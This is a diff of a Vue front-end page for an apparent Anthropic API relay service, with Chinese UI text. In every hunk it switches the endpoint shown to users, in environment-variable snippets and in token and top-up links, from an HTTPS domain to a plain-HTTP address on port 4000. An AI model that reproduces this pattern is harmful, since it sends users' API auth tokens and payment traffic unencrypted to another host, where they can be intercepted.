@@ -57,7 +57,7 @@ async function copyFreeModelName(model: string) {
 }
 
 async function copyEnvVars() {
-  const envText = `export ANTHROPIC_BASE_URL="https://coder.guygubaby.top"
+  const envText = `export ANTHROPIC_BASE_URL="http://520qq.cn:4000"
 export ANTHROPIC_AUTH_TOKEN="你的令牌"
 export ANTHROPIC_MODEL="${selectedModel.value}"`
 
@@ -89,7 +89,7 @@ export ANTHROPIC_MODEL="${selectedModel.value}"`
               使用说明
             </RouterLink>
             <motion.a
-              href="https://coder.guygubaby.top"
+              href="http://520qq.cn:4000"
               target="_blank"
               rel="noopener noreferrer"
               :while-hover="{ scale: 1.05 }"
@@ -179,7 +179,7 @@ export ANTHROPIC_MODEL="${selectedModel.value}"`
               <h3 class="text-base font-semibold text-[#3D2C2C]">环境变量配置</h3>
               <p class="text-sm text-[#6B5044] mt-1">复制以下环境变量到您的配置文件中</p>
               <motion.a
-                href="https://coder.guygubaby.top/console/token"
+                href="http://520qq.cn:4000/console/token"
                 target="_blank"
                 rel="noopener noreferrer"
                 :while-hover="{ scale: 1.02 }"
@@ -193,7 +193,7 @@ export ANTHROPIC_MODEL="${selectedModel.value}"`
               </motion.a>
             </div>
             <div class="relative">
-              <pre class="bg-[#FFF8F3] p-5 text-sm text-[#3D2C2C] overflow-x-auto"><code>export ANTHROPIC_BASE_URL="https://coder.guygubaby.top"
+              <pre class="bg-[#FFF8F3] p-5 text-sm text-[#3D2C2C] overflow-x-auto"><code>export ANTHROPIC_BASE_URL="http://520qq.cn:4000"
 export ANTHROPIC_AUTH_TOKEN="你的令牌"
 export ANTHROPIC_MODEL="{{ selectedModel }}"</code></pre>
               <motion.button
@@ -283,7 +283,7 @@ export ANTHROPIC_MODEL="{{ selectedModel }}"</code></pre>
               <div>
                 <p class="text-[#3D2C2C] font-medium">进入个人中心-钱包管理</p>
                 <motion.a
-                  href="https://coder.guygubaby.top/console/topup"
+                  href="http://520qq.cn:4000/console/topup"
                   target="_blank"
                   rel="noopener noreferrer"
                   :while-hover="{ scale: 1.02 }"
